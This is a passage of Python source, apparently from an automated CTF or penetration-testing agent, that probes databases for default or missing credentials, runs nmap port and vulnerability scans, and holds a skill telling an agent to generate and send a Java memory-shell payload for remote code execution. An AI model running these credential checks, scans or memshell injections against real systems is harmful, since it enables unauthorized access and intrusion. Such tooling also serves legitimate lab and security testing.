            ("mongo_noauth", f"mongosh --host {target} --eval 'db.adminCommand({{listDatabases: 1}})' --quiet 2>/dev/null | head -20", 10),
            ("pg_default", f"PGPASSWORD=postgres psql -h {target} -U postgres -c '\\l' 2>/dev/null | head -20", 10),
        ]

        for name, cmd, timeout in checks:
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1
            all_flags.extend(self._extract_flags_from_output(r.output))
            if r.success and r.output.strip() and "error" not in r.output.lower()[:100]:
                result.raw_outputs[name] = r.output[:2000]
                result.vulnerabilities.append(f"{name}: unauthorized access!")
                # Try to find flag in databases
                if "mysql" in name and "Database" in r.output:
                    r2 = self._run_cmd(
                        f"mysql -h {target} -u root --connect-timeout=5 -e "
                        f"\"SELECT GROUP_CONCAT(table_schema,'.',table_name) FROM information_schema.tables "
                        f"WHERE table_name LIKE '%flag%'\" 2>/dev/null",
                        timeout=10
                    )
                    all_flags.extend(self._extract_flags_from_output(r2.output))
                    if r2.success:
                        result.raw_outputs["mysql_flag_tables"] = r2.output[:500]

        result.flags_found = list(set(all_flags))
        result.summary = f"DB enum {target} | Vulns: {len(result.vulnerabilities)} | Flags: {len(result.flags_found)}"
        return result

    def _skill_deep_port_scan(self, target: str, **kwargs) -> SkillResult:
        """Deep port scan: all TCP + top UDP + vuln scripts"""
        result = SkillResult(skill_name="deep_port_scan", success=True, steps_executed=0,
                             steps_total=3, summary="")
        all_flags = []

        # 1. Full TCP
        r = self._run_cmd(f"nmap -sV -p- -T4 --open {target} 2>/dev/null", timeout=600)
        result.steps_executed += 1
        result.raw_outputs["full_tcp"] = r.output[:3000]
        all_flags.extend(self._extract_flags_from_output(r.output))
        if r.success:
            for line in r.output.split("\n"):
                if "/tcp" in line and "open" in line:
                    parts = line.split()
                    port = int(parts[0].split("/")[0])
                    result.open_ports.append({"port": port, "proto": "tcp"})
                    if len(parts) > 2:
                        result.services.append({"port": port, "service": parts[2], "version": " ".join(parts[3:])})

        # 2. Top UDP
        r = self._run_cmd(f"nmap -sU --top-ports 50 -T4 --open {target} 2>/dev/null | head -60", timeout=120)
        result.steps_executed += 1
        if r.success:
            result.raw_outputs["udp"] = r.output[:1000]
            for line in r.output.split("\n"):
                if "/udp" in line and "open" in line:
                    parts = line.split()
                    port = int(parts[0].split("/")[0])
                    result.open_ports.append({"port": port, "proto": "udp"})

        # 3. Vuln scripts on found ports
        tcp_ports = [str(p["port"]) for p in result.open_ports if p.get("proto") == "tcp"]
        if tcp_ports:
            port_str = ",".join(tcp_ports[:20])
            r = self._run_cmd(f"nmap --script=vuln -p {port_str} -T4 {target} 2>/dev/null | head -150", timeout=300)
            result.steps_executed += 1
            all_flags.extend(self._extract_flags_from_output(r.output))
            if r.success:
                result.raw_outputs["vuln_scan"] = r.output[:3000]
                if "VULNERABLE" in r.output.upper():
                    for line in r.output.split("\n"):
                        if "VULNERABLE" in line.upper() or "CVE-" in line:
                            result.vulnerabilities.append(line.strip())
        else:
            result.steps_executed += 1

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"Deep scan {target} | TCP ports: {len([p for p in result.open_ports if p.get('proto')=='tcp'])} | "
            f"UDP ports: {len([p for p in result.open_ports if p.get('proto')=='udp'])} | "
            f"Vulns: {len(result.vulnerabilities)} | Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_java_memshell_inject(self, target: str, vuln_type: str = "shiro", **kwargs) -> SkillResult:
        """Inject Java Memory Shell for stable RCE on no-echo vulns"""
        logger.info(f"Skill: java_memshell_inject on {target} for {vuln_type}")
        
        guidance = (
            f"Target {target} is suspected to be vulnerable to {vuln_type}.\n"
            "To successfully inject a MemShell, you should:\n"
            "1. Avoid blind `cat /flag` commands due to Permission Denied risks on /root.\n"
            "2. Use `codegen` tool to write a Python script that generates and sends a MemShell payload.\n"
            "3. If forced to blind-RCE, ALWAYS verify outbound connection via DNSLog before flying blind.\n"
        )
        
        return SkillResult(
            skill_name="java_memshell_inject",
            success=True,
            steps_executed=1,
            steps_total=1,
            summary="MemShell Injection Strategy Initialized. Use `codegen` to execute memshell logic.",
            raw_outputs={"guidance": guidance}
        )
